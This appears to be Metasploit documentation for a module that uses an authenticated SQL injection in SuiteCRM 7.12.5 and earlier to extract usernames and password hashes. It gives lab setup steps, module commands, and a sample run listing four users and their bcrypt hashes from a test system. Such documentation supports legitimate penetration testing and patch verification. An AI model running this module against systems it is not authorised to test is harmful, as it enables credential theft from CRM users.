## Description
This module exploits an authenticated SQL injection in SuiteCRM installations below or equal to version 7.12.5. The 
vulnerability allows for union and blind boolean based SQLi to be exploited in order to collect usernames and password 
hashes from the SuiteCRM database.

## Vulnerable Application

The SQLi exploited by this module depends on the existence of at least one 'Account' being registered in SuiteCRM. 
An account can be added by authenticating to the GUI. Then at the top of the screen, click the 'Create' dropdown, 
select 'Create Accounts'. The Name field is the only required field, input a name, click save and the target should 
be exploitable.

### Docker compose

**Prerequisites:** [Docker](https://docs.docker.com/get-docker/) and
[Docker Compose](https://docs.docker.com/compose/install/) must be
installed first.

To create a SuiteCRM 7.12.5 Docker container, first create a new folder, 
then save the following content as `docker-compose.yml`:

```
version: '2'
services:
  mariadb:
    image: docker.io/bitnami/mariadb:10.6
    environment:
      # ALLOW_EMPTY_PASSWORD is recommended only for development.
      - ALLOW_EMPTY_PASSWORD=yes
      - MARIADB_USER=bn_suitecrm
      - MARIADB_DATABASE=bitnami_suitecrm
      - MARIADB_PASSWORD=bitnami123
    volumes:
      - 'mariadb_data:/bitnami/mariadb'
  suitecrm:
    image: docker.io/bitnami/suitecrm:7.12.5
    ports:
      - '80:8080'
      - '443:8443'
    environment:
      - SUITECRM_DATABASE_HOST=mariadb
      - SUITECRM_DATABASE_PORT_NUMBER=3306
      - SUITECRM_DATABASE_USER=bn_suitecrm
      - SUITECRM_DATABASE_NAME=bitnami_suitecrm
      - SUITECRM_DATABASE_PASSWORD=bitnami123
      # ALLOW_EMPTY_PASSWORD is recommended only for development.
      - ALLOW_EMPTY_PASSWORD=yes
    volumes:
      - 'suitecrm_data:/bitnami/suitecrm'
    depends_on:
      - mariadb
volumes:
  mariadb_data:
    driver: local
  suitecrm_data:
    driver: local 
```

Finally, in the same directory as the `docker-compose.yml` file, run: `docker-compose up -d`.

Note that the default username to log in will be `user` and the password will be `bitnami`. If you
want to change these, put the following lines under the `environment` section:

```
    environment:
      - SUITECRM_USERNAME=my_user
      - SUITECRM_PASSWORD=my_password
```

The above would set the username to `my_user` and the password to `my_password`.

For more information on the docker compose file, refer to
https://github.com/bitnami/containers/tree/main/bitnami/suitecrm.

### Install from source

Source code can be found here: [SuiteCRM v7.12.5](https://github.com/salesagility/SuiteCRM/archive/refs/tags/v7.12.5.tar.gz) 

Instructions on installing from source can be found here: [Installation Guide](https://docs.suitecrm.com/admin/installation-guide/downloading-installing/) 

The following setup was installed on Ubuntu 20.04:

1. Setup and install MySQL:
    1. `sudo apt update`
    1. `sudo apt install mysql-server`
    1. `sudo systemctl start mysql.service`
    1. `sudo mysql` (open the mysql prompt)
    1. `mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';` (change the password 
       of the root user)
       
1. Install Apache
    1. `sudo apt install apache2`
    1. `sudo systemctl enable apache2`
    1. `sudo systemctl start apache2`
       
1. Install php and its dependencies
    1. `sudo apt -y install php7.4`
    1. `sudo apt install -y php-cli php-common php-curl php-mbstring php-gd php-mysql php-soap php-xml php-imap php-intl php-opcache php-json php-zip`
    1. `sudo apt install composer`
    1. `composer install`
    
1. Setup and install SuiteCRM 7.12.5
    1. `wget https://github.com/salesagility/SuiteCRM/archive/refs/tags/v7.12.5.tar.gz`
    1. `gunzip v7.12.5.tar.gz`
    1. `tar -xvf v7.12.5.tar`
    1. `sudo cp -r SuiteCRM-7.12.5/. /var/www/html`
    1. `cd /var/www/html`
    1. `sudo chown -R www-data:www-data .`
    1. `sudo chmod -R 755 .`
    1. `sudo chmod -R 775 custom modules themes data upload`
    1. `sudo chmod 775 config_override.php 2>/dev/null`
    1. Navigate to http://localhost/install.php and follow the installation wizard to complete the install
    

## Verification Steps

1. Start up metasploit
1. Do: `use auxiliary/gather/suite_crm_export_sqli`
1. Do: `set RHOSTS [IP]`
1. Configure a user and password by setting `USERNAME` and `PASSWORD`.
1. Do: `run`

## Scenarios

### SuiteCRM 7.12.5 running on Ubuntu 20.04
```
msf6 auxiliary(gather/suite_crm_export_sqli) > set rhosts 192.168.123.207
rhosts => 192.168.123.207
msf6 auxiliary(gather/suite_crm_export_sqli) > set username normal_user
username => normal_user
msf6 auxiliary(gather/suite_crm_export_sqli) > set password normal_user
password => normal_user
rmsf6 auxiliary(gather/suite_crm_export_sqli)) > run

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Authenticating as normal_user
[+] Authenticated as: normal_user
[*] Version detected: 7.12.5
[+] The target is vulnerable.
[*] Fetching Users, please wait...
SuiteCRM User Names
===================

 Username
 --------
 JoeDerp
 admin
 msfuser
 non_admin

[*] Fetching Hashes, please wait...
[+] (1/4) Username : admin ; Hash : $2y$10$TqjKZ4dWGNYQGiwDu5qSUu0RIsAO7uPRdIvX7gIm4pwjn.2t4ZYvi
[+] (2/4) Username : JoeDerp ; Hash : $2y$10$Qt4iloeWIQhgVX85cMNHieGVXYltvC/7fDaY1y5MhM90SZpENSJCm
[+] (3/4) Username : msfuser ; Hash : $2y$10$kr3tWzSZDbM9/y.FLZKf2esC1aghyEMa4e8KovsCCUE/GHlBjkgLe
[+] (4/4) Username : non_admin ; Hash : $2y$10$A.yaUnsujWh38ODrekuv0OxUGdPRcvKmgpYStJib5VoFigjQQDsfy
SuiteCRM User Credentials
=========================

 Username   Hash
 --------   ----
 JoeDerp    $2y$10$Qt4iloeWIQhgVX85cMNHieGVXYltvC/7fDaY1y5MhM90SZpENSJCm
 admin      $2y$10$TqjKZ4dWGNYQGiwDu5qSUu0RIsAO7uPRdIvX7gIm4pwjn.2t4ZYvi
 msfuser    $2y$10$kr3tWzSZDbM9/y.FLZKf2esC1aghyEMa4e8KovsCCUE/GHlBjkgLe
 non_admin  $2y$10$A.yaUnsujWh38ODrekuv0OxUGdPRcvKmgpYStJib5VoFigjQQDsfy

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```